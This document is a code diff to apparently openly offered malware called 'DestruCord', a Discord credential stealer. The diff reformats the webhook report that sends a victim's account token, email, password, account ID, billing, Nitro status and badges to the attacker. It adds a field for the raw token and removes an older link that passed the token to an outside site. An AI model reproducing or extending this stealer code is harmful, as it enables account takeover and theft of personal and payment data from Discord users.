@@ -318,44 +318,37 @@ const login = async (email, password, token) => {
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
-    embeds: [
+ embeds: [
       {
+        title: "DestruCord Login",
+            description: "[<a:blackcap:961249786315538524> │ **Oh you have DestruCorded someone**](https://github.com/KSCHdsc)",
+
             "color": config.embed_color,
             "fields": [
                 {
-                    "name": "@SN - Token:",
-                    "value": `\`\`\`${token}\`\`\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
-                    "inline": false
-                },
-                {
-                    "name": "@SN - Username:",
+                    "name": "**Account Name**",
                     "value": `\`${json.username +"#" + json.discriminator}\``,
                     "inline": true
                 },
                 {
-                    "name": "@SN - ID:",
+                    "name": "**Account ID**",
                     "value": `\`${json.id}\``,
                     "inline": true
                 },
                 {
-                    "name": "@SN - IP:",
-                    value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
-                    "inline": true
-                },
-                {
-                    "name": "@SN - Badges:",
-                    "value": `${badges}`,
-                    "inline": true
-                },
-                {
-                    "name": "@SN - Nitro Type:",
+                    "name": "**Nitro:**",
                     "value": `${nitro}`,
                     "inline": true
                 },
                 {
-                    "name": "@SN - Billing:",
+                    "name": "**Billing:**",
                     "value": `\`${billing}\``,
                     "inline": true
+                },
+                {
+                    "name": "**Badges:**",
+                    "value": `${badges}`,
+                    "inline": false
                 },
                 {
                     "name": "**Account Email**",
@@ -367,6 +360,11 @@ const login = async (email, password, token) => {
                     "value": `\`${password}\``,
                     "inline": true
                 },
+                {
+                    "name": "**Token**",
+                    "value": `\`${token}\``,
+                    "inline": false
+                }
             ],
             "author": {
                 "name": "DestruCord V1"
